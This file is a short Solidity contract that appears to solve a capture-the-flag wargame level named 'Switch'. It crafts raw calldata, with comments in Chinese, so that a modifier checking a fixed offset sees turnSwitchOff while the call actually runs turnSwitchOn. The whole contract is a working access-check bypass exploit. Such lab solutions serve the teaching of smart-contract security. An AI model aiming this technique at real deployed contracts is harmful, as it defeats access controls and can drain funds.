// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external view returns (bool);
}

contract SwitchAttack {
    function attack(address target) external {
        // 构造恶意 calldata
        // 目标：让 onlyOff 检查位置 68 看到 turnSwitchOff()
        //      但实际执行 turnSwitchOn()
        
        bytes memory payload = new bytes(100);
        
        // [0x00-0x04] flipSwitch selector
        payload[0] = 0x30;
        payload[1] = 0xc1;
        payload[2] = 0x3a;
        payload[3] = 0xde;
        
        // [0x04-0x24] _data offset = 0x60 (96)
        payload[0x23] = 0x60;
        
        // [0x44-0x48] turnSwitchOff selector at position 68
        payload[0x44] = 0x20;
        payload[0x45] = 0x60;
        payload[0x46] = 0x6e;
        payload[0x47] = 0x15;
        
        // [0x60-0x80] 实际 _data 长度 = 4
        payload[0x7f] = 0x04;
        
        // [0x80-0x84] turnSwitchOn selector
        payload[0x80] = 0x76;
        payload[0x81] = 0x22;
        payload[0x82] = 0x7e;
        payload[0x83] = 0x12;
        
        (bool success,) = target.call(payload);
        require(success, "Attack failed");
    }
}
